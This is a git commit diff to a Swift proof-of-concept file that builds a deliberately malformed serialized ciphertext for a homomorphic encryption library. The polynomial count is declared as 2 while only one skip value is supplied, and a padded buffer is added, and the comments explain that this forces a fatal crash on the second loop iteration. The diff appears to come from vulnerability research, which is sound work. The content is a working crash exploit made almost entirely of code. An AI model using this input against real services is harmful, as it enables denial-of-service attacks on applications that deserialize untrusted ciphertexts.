49474692c7c07d5fc487181f971545e59e62e52f
Salman <0daytrace@gmail.com>
2026-09-05 09:39:48 +0100

    Update main.swift

--- Sources/HE_PoC/main.swift
+++ Sources/HE_PoC/main.swift
@@ -2,18 +2,18 @@ import Foundation
 import HomomorphicEncryption
 
 do {
-    // Use the correct, valid predefined RLWE parameter that supports UInt64
     let params = try EncryptionParameters<UInt64>(from: .insecure_n_16_logq_60_logt_15)
-    
-    // Context is generic over the Scheme (e.g., Bfv<UInt64>)
     let context = try Context<Bfv<UInt64>>(encryptionParameters: params)
 
     // polyCount = 2 (Little Endian: 0x02, 0x00)
-    let fakePolysBuffer: [UInt8] = [0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
+    // We provide 250 bytes of padding. The first poly needs ~120 bytes and will succeed.
+    // This forces the loop to reach the 2nd iteration, where skipLSBs[1] will fatally crash.
+    var fakePolysBuffer: [UInt8] = [0x02, 0x00]
+    fakePolysBuffer.append(contentsOf: [UInt8](repeating: 0, count: 250))
     
     let maliciousSerialized = SerializedCiphertext<UInt64>.full(
         polys: fakePolysBuffer, 
-        skipLSBs: [0], // Length is 1, but polyCount is 2. This triggers the crash.
+        skipLSBs: [0], // Length is 1, but polyCount is 2. Triggers fatal crash on iteration 2.
         correctionFactor: 1
     )
 
